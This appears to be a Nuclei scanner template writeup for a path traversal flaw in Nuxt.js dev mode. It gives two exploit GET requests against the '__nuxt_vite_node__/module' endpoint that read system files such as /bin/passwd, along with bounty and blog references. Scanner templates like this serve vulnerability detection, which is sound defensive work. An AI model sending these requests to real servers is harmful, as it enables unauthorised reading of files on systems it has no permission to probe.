# Nuclei Template: Semi Arbitrary File Read in Dev Mode - Nuxt.js
**Template ID:** nuxt-js-semi-lfi
**Vulnerability Class:** Path Traversal
**Severity:** Medium
**CWE:** CWE-22
**Source:** Nuclei Template (`nuxt-js-semi-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Arbitrary File Read in Dev Mode in Nuxt.js

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/__nuxt_vite_node__/module//bin/passwd
GET {{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe
```

## References
- https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/
- https://bryces.io/blog/nuxt3
- https://twitter.com/fofabot/status/1669339995780558849
